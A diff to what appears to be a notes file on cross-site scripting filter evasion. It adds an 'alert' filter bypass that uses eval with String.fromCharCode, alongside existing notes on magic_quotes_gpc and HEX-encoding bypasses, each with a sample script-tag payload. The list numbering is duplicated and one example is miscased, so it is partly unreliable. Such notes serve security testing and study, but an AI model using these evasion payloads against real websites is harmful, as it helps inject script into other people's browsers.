@@ -21,6 +21,10 @@ AJAX = asynchronous JavaScript (they change their contents by manipulating areas
  **1. magic_quotes_gpc=ON bypass:**  
    * Bypass this by converting your text to decimal characters and place them inside the java function: `String.fromCharCode()`  
    * EG `<script>alert('1234');</script> = <script>alert(string.fromcharcode(49, 50, 51, 52));</script>`  
+
+ **2. 'alert' filter bypass:
+   * Bypass this by converting your text to decimal characters and place them inside the java function:  
+   `<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>`
    
  **2. HEX encoding:**  
    * you can encode your payload as HEX, I could not get this to work, however this apparently is a valid bypass  
